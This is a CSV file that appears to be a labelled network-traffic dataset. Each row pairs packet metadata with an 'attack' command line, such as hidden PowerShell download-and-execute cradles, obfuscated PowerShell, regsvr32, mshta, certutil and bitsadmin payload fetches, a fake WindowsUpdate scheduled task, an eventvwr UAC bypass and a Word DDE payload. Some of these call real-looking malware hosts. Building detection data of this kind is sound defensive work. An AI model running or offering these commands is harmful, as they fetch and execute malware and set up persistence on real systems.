field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
TTL,109.196.225.86,203.139.121.234,52816,30303,6,"wmic.exe os get ved5hit39, 25hit8, numberofusers /format:""https://storage.googleapis.com/ultramaker/09/v.txt""
",880,880
TTL,116.58.147.90,203.139.121.234,44410,30303,6,"wmic.exe os get QMUTSQPK, JUXKBVOK, LNFTZKMH, freephyscialmemory /format:""https://storage.googleapis.com/ultramaker/08/vv.txt""
",1016,1016
TTL,13.5.165.135,203.139.121.234,30303,59386,6,"bitsadmin.exe /transfer msd5 /priority foreground https://storage.googleapis.com/ultramaker/x/ 09/falcvonxrenwb.jpg.zip.log?
",1000,1000
TTL,100.163.44.160,203.139.113.8,62112,80,6,"certutil.exe -decode %PUBLIC%\Libraries\temporary\falxconxrenwb.jpg.z
",560,560
TTL,109.58.252.70,203.139.121.234,30303,36694,6,"regsvr32.exe /s falxconxrenw64.~
",264,264
TTL,130.85.161.127,203.139.121.234,30303,50356,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL].asp') | iex
",912,912
TTL,135.177.15.99,203.139.121.234,30303,49024,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\[Same Random Key]').[Random Value Name])));
",1704,1704
TTL,135.177.98.249,203.139.121.234,50322,30303,6,"powershell.exe -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]: ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('https://somerandomevildomain.xx /somerandomflie'))
",1848,1848
TTL,133.4.84.228,3.192.64.103,46172,443,6,"Regsvr.exe /s /u /i:http://xxx.somerandomevildomain.xx/evilpath.xml scrobj.dl
",624,624
TTL,138.164.245.77,203.139.121.234,56993,30303,6,"powershell.exe ""if(!([string](Get-WMIobject -Namespace root\Subscription -Class __FilterToConsumerBinding )).contains('SCM Event Filter')) {IEX(New-Object Net.WebClient).DownloadString('[URL]')}""
",1568,1568
TTL,203.139.113.8,100.163.44.160,80,62112,6,"powershell.exe ( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe($nsadasd = &(new-object) random;$YYU = .(new-object) System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = http://lecap-services .fr/wiB9s/?http://nikitinskysport .ru/R5ytZ/?http://beauty-tea .com/hB2JAMO/?http://zekiatagur .com/gCWu/?http://arkonziv.com/Site7_Pixelhobbies/iV1PKqL/.Split(?);$SDC = $env:public  \  $NSB  ('.exe');foreach($asfc in $ADCX){try{$YYU.""Do`Wnl`OadFI`le""($asfc.""ToStr`i`Ng""(), $SDC);&(Invoke-Item)($SDC);break;}catch{})
",4584,4584
TTL,145.225.239.255,203.139.121.234,56944,30303,6,"powershell.exe set-item ('variable:skeail') ( [type]( 'environment' ) ) ; ( .('ls') ('contextexecutionvariable') ).value.invokecommand.('invokescript' ).invoke( ( ${skeail}::('getenvironmentvariable').invoke( 'diy',('process' ))))
",1848,1848
TTL,203.139.118.176,58.48.198.40,80,49708,6,"powershell.exe SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \""{2}{3}{1}{0}\""-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \""{4}{0}{7}{1}{5}{2}{3}{6}\""-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\""VaL`UE\"".\""iN`VO`k`eCom`MANd\"".( \""{3}{1}{2}{0}\"" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\""{0}{4}{1}{2}{5}{3}\"" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\""{1}{0}\""-f's','PrOCeS' ))) )
",3360,3360
TTL,133.4.255.147,24.254.219.238,4501,55558,17,"powershell.exe $zWC='IUA';$QHY='http://trabanatours.com/u@http://pizzeriarondo.si/z8cG@http://diahmarsidi.com/MPCTKG@http://ogrodyusmiechu.pl/iubv8v@http://assurance-charente.fr/sfh'.Split('@');$aBp=([System.IO.Path]::GetTempPath()+'\mQN.exe');$pdZ =New-Object -com 'msxml2.xmlhttp';$tpk = New-Object -com 'adodb.stream';foreach($uiA in $QHY){try{$pdZ.open('GET',$uiA,0);$pdZ.send();$tpk.open();$tpk.type = 1;$tpk.write($pdZ.responseBody);$tpk.savetofile($aBp);Start-Process $aBp;break}catch{}}
",3960,3960
TTL,185.50.99.189,203.139.121.234,40828,30303,6,"schtasks.exe /Create /sc MINUTE /MO 1 /TN WindowsUpdate /TR ""Powershell -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\""http://118.193.251.137/dropbox/?p=BT67HU78HZ\\\"",\\\""$env:public\svchost325.vbs\\\"");(New-Object -com Shell.Application).ShellExecute(\\\""$env:public\svchost325.vbs\\\"");""
",2440,2440
TTL,168.247.233.24,203.139.121.234,52874,30303,6,"powershell.exe -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\'http[:]//118.193.251[.]137/dropbox/?p=BT67HU78HZ\\\',\\\'$env:public\svchost325.vbs\\\');(New-Object -com Shell.Application).ShellExecute(\\\'$env:public\svchost325.vbs\\\');'
",2016,2016
TTL,174.200.239.33,203.139.121.234,30303,51702,6,"powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\FTZLZTRLAPJCLE').ZRAKUTR)));
",1584,1584
TTL,192.233.225.5,163.62.128.220,443,50571,6,"powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://[URL],'%TEMP%\\pu457.exe') & reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d %TEMP%\\pu457.exe /f & eventvwr.exe & PING -n 15 127.0.0.1>nul & %TEMP%\\pu457.exe
",2192,2192
TTL,139.196.243.33,203.139.121.234,44750,30303,6,"mshta.exe javascript:d7hcQ4a=""vn"";n0a=new%20ActiveXObject(""WScript.Shell"");Rtf7j=""HIPc"";X18ycI=n0a.RegRead(""HKCU\\software\\tN32795\\74gjfzcsfI"");jM5IV6m=""QJ"";eval(X18ycI);XIaL0uze=""lYuLz1vG""
",1536,1536
TTL,144.196.129.176,203.139.121.234,41568,30303,6,"winword.exe {ddeauto c:\\windows\\system32\\cmd.exe ""/k powershell IEX(New-Object Net.WebClient).Downloadstring('[URL]' )"" \* MERGEFORmAT}
",1112,1112
